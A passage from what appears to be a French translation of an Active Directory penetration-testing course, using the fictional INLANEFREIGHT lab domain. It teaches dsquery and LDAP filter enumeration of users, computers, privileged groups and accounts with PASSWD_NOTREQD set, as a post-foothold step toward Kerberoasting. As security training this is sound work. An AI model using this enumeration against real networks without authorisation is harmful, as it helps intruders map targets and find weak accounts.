"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"

```

#### Recherche d'ordinateur

  Recherche d'ordinateur

```
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"

```

Nous pouvons utiliser une [recherche générique dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) pour afficher tous les objets d'une unité d'organisation, par exemple.

#### Recherche générique

  Recherche générique

```
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

<SNIP>

```

Nous pouvons, bien sûr, combiner `dsquery`avec les filtres de recherche LDAP de notre choix. L'exemple ci-dessous recherche les utilisateurs dont l' `PASSWD_NOTREQD`indicateur est défini dans l' `userAccountControl`attribut.

#### Utilisateurs avec ensemble d'attributs spécifiques (PASSWD_NOTREQD)

  Utilisateurs avec ensemble d'attributs spécifiques (PASSWD_NOTREQD)

```
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080

```

Le filtre de recherche ci-dessous recherche tous les contrôleurs de domaine dans le domaine actuel, en se limitant à cinq résultats.

#### Recherche de contrôleurs de domaine

  Recherche de contrôleurs de domaine

```
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$

```

### Filtrage LDAP expliqué

Vous remarquerez dans les requêtes ci-dessus que nous utilisons des chaînes telles que `userAccountControl:1.2.840.113556.1.4.803:=8192`. Ces chaînes sont des requêtes LDAP courantes qui peuvent également être utilisées avec plusieurs outils différents, notamment AD PowerShell, ldapsearch et bien d'autres. Décomposons-les rapidement :

`userAccountControl:1.2.840.113556.1.4.803:`Spécifie que nous examinons les [attributs de contrôle de compte d'utilisateur (UAC)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) pour un objet. Cette partie peut changer pour inclure trois valeurs différentes que nous expliquerons ci-dessous lors de la recherche d'informations dans AD (également appelées [identificateurs d'objet (OID)](https://ldap.com/ldap-oid-reference-guide/) .\
`=8192`représente le masque décimal que nous voulons faire correspondre dans cette recherche. Ce nombre décimal correspond à un attribut UAC correspondant indicateur qui détermine si un attribut comme `password is not required`ou `account is locked`est défini. Ces valeurs peuvent être composées et créer plusieurs entrées de bits différentes. Vous trouverez ci-dessous une liste rapide des valeurs potentielles.

#### Valeurs UAC

![texte](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

#### Chaînes de correspondance OID

Les OID sont des règles utilisées pour faire correspondre les valeurs de bit avec les attributs, comme indiqué ci-dessus. Pour LDAP et AD, il existe trois principales règles de correspondance :

1.  `1.2.840.113556.1.4.803`

Lorsque vous utilisez cette règle comme nous l'avons fait dans l'exemple ci-dessus, nous disons que la valeur du bit doit correspondre complètement pour répondre aux exigences de recherche. Idéal pour faire correspondre un attribut singulier.

1.  `1.2.840.113556.1.4.804`

Lorsque vous utilisez cette règle, nous disons que nous voulons que nos résultats affichent toute correspondance d'attribut si un bit de la chaîne correspond. Cela fonctionne dans le cas d'un objet ayant plusieurs attributs définis.

1.  `1.2.840.113556.1.4.1941`

Cette règle est utilisée pour faire correspondre les filtres qui s'appliquent au nom distinctif d'un objet et effectuera une recherche dans toutes les entrées de propriété et d'appartenance.

#### Opérateurs logiques

Lors de la création de chaînes de recherche, nous pouvons utiliser des opérateurs logiques pour combiner des valeurs pour la recherche. Les opérateurs `&` `|`et `!`sont utilisés à cette fin. Par exemple, nous pouvons combiner plusieurs [critères de recherche](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) avec l' `& (and)`opérateur comme suit :\
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

L'exemple ci-dessus définit le premier critère selon lequel l'objet doit être un utilisateur et le combine avec la recherche d'une valeur de bit UAC de 64 (le mot de passe ne peut pas changer). Un utilisateur avec cet ensemble d'attributs correspondrait au filtre. Vous pouvez aller encore plus loin et combiner plusieurs attributs comme `(&(1) (2) (3))`. Les opérateurs `!`(non) et (ou) peuvent fonctionner de la même manière. `|`Par exemple, notre filtre ci-dessus peut être modifié comme suit :\
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

Cela rechercherait tout objet utilisateur dont `NOT`l'attribut Password Can't Change est défini. En ce qui concerne les utilisateurs, les groupes et d'autres objets dans AD, notre capacité à effectuer des recherches avec des requêtes LDAP est assez étendue.

Beaucoup peut être fait avec les filtres UAC, les opérateurs et la correspondance des attributs avec les règles OID. Pour l'instant, cette explication générale devrait être suffisante pour couvrir ce module. Pour plus d'informations et une plongée plus approfondie dans l'utilisation de ce type de recherche par filtre, consultez le module [Active Directory LDAP .](https://academy.hackthebox.com/course/preview/active-directory-ldap)

* * * * *

Nous avons maintenant utilisé notre pied pour effectuer une énumération authentifiée avec des outils sur les hôtes d'attaque Linux et Windows et en utilisant des outils intégrés et des informations validées sur l'hôte et le domaine. Nous avons prouvé que nous pouvons accéder aux hôtes internes, à la pulvérisation de mots de passe et aux travaux d'empoisonnement LLMNR/NBT-NS et que nous pouvons utiliser des outils qui résident déjà sur les hôtes pour effectuer nos actions. Nous allons maintenant aller plus loin et nous attaquer à un TTP que chaque pentester AD devrait avoir dans sa ceinture à outils, `Kerberoasting`.
